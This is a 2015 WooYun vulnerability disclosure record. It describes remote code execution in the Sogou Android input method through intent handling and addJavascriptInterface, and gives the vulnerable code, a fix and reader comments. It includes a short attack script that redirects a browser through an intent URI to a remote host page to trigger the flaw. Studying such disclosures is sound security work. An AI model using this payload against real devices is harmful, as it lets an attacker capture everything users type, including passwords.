{"id": 44994, "wybug_id": "wooyun-2015-089956", "wybug_title": "搜狗输入法远程代码执行可以恶意利用劫持用户输入", "wybug_corp": "搜狗", "wybug_author": "hqdvista", "wybug_date": "2015-01-05 11:16", "wybug_open_date": "2015-04-05 11:18", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向公众公开  简要描述： 搜狗输入法远程代码执行，用户输入的所有内容包括密码均可一览无余 详细说明：  搜狗输入法最新版（7.2.2) 对intent传入参数处理不当，直接引入了jsinterface中，导致代码执行。同时由于搜狗输入法targetSDK过低，所有<=4.4.2的安卓设备均受影响。0x01: JADE静态检测发现一个如下taint path:\nTaint source:$r3 = virtualinvoke $r0.<sogou.mobile.explorer.hotwords.minibrowser.MiniWebViewActivity: android.content.Intent getIntent()>() on line 107 in method <sogou.mobile.explorer.hotwords.minibrowser.MiniWebViewActivity: void onCreate(android.os.Bundle)>Taint path:$r3 = virtualinvoke $r2.<java.lang.String: android.content.Intent getDataString()>() on line 112 in method <sogou.mobile.explorer.hotwords.minibrowser.MiniWebViewActivity: void processExtraData(android.content.Intent)>Taint sink:$r2.<com.tencent.smtt.sdk.WebView$SystemWebView: void loadUrl(java.lang.String)>($r1) on line 780 in method <com.tencent.smtt.sdk.WebView: void loadUrl(java.lang.String)>\n调用关系图: onCreate -> processExtraData -> loadUrl到这里已经可以引起钓鱼、file域跨域读取文件等问题了。然而后面还有更严重的问题0x02: 同时静态检测也发现MiniWebViewActivity使用了addJavascriptInterface，同时此APK的targetSDK为7(Android 2.1)，导致addjsinterface漏洞的影响范围扩大到了所有使用webview的Android设备，也就是<=4.4.2，根据友盟数据包括95%的国内安卓设备。由于输入法应用的关键地位，其掌控了用户所有的输入内容，控制了输入法进程之后，所有用户的输入，包括密码、身份证等暴露无疑。\n@SuppressLint(value={\"SetJavaScriptEnabled\"}) private void initWebView() {        LogUtil.i(\"Mini WebView\", \"-------- init webview -------\"); /*omit*/        this.mWebView.addJavascriptInterface(new ContextShareInterface(), \"sogoumse_interface\");        this.mWebView.requestFocus();\n使用intent scheme可将此问题拓展为远程代码执行   漏洞证明：  问题代码:\nprivate void processExtraData(Intent arg3) {        if(arg3 != null && (\"android.intent.action.VIEW\".equals(arg3.getAction())) && arg3.getData()                 != null) {            this.recreateWebView();            this.mWebView.loadUrl(arg3.getDataString());        }    }\n代码执行例子：在sdcard中写入文件\n\n4.3依然受影响\n\n\n\n远程攻击代码：<script>    location.href = \"intent:http://myqsc.sinaapp.com/fuck.html#Intent;SEL;component=com.sohu.inputmethod.sogou/sogou.mobile.explorer.hotwords.minibrowser.MiniWebViewActivity;end\";</script>   修复方案：  处理传入的url，更新targetSDK   版权声明：转载请注明来源 hqdvista@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-01-06 12:47 厂商回复： 感谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-05 11:17 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  我猜给5rank    \n     2015-01-05 11:20 |    \t\t南宁网警Mx \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | 我是独行侠。有心交友qq1552673833)\t\t \n  2rank     \n     2015-01-05 11:21 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  2-5rank已经给多你了    \n     2015-01-05 11:23 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  无影响厂商忽略    \n     2015-01-05 11:23 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n   - - 咋回事，标题变了    \n     2015-01-05 11:26 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  输入法的命令执行杀软的拒绝服务都是非常危险的.    \n     2015-01-05 11:36 |    \t\tQiudays \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:9        | 感觉自己萌萌哒)\t\t \n  永少你好...    \n     2015-01-05 11:41 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Qiudays @瘦蛟舞 坐等洞主demo     \n     2015-01-05 11:43 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  卧槽这个叼    \n     2015-01-05 11:59 |    \t\txy小雨 \t\t\t( 普通白帽子  |\t\t\t        Rank:171 漏洞数:50        | 成为海贼王的男人)\t\t \n  5rank拿好    \n     2015-01-05 12:31 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  3rank拿好    \n     2015-01-05 16:11 |    \t\t鸟云厂商  \t\t\t( 核心白帽子 |\t\t\t        Rank:1313 漏洞数:146        | 中国菜鸟)\t\t \n  感谢支持，欢迎您在SGSRC平台提交漏洞    \n     2015-01-05 18:18 |    \t\tcorse \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 学习账号，没事别乱评论)\t\t \n  楼上正解，2rank拿好！    \n     2015-01-05 18:20 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  我们已经冲其他渠道获取此漏洞，故忽略处理    \n     2015-01-06 13:27 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  干的漂亮！    \n     2015-01-13 11:05 |    \t\thqdvista \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:31        | N/A)\t\t \n  演示视频地址： http://weibo.com/2214340953/BFgKwE8IN?type=repost    \n     2015-01-13 12:29 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  牛，视频已欣赏！    \n     2015-01-13 13:07 |    \t\t只发通用型 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:14        | 刷通用型奖金小号)\t\t \n  毕竟天才少年    \n     2015-01-27 01:12 |    \t\tfox \t\t\t( 普通白帽子  |\t\t\t        Rank:159 漏洞数:16        | fox)\t\t \n  @hqdvistalocation.href = \"intent:\"、这个需要浏览器支持把    \n     2015-08-30 18:33 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:25        | 不会挖洞洞的猿猿不是好学生)\t\t \n  @hqdvista 我想知道你是怎么让搜狗调用webview链接的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}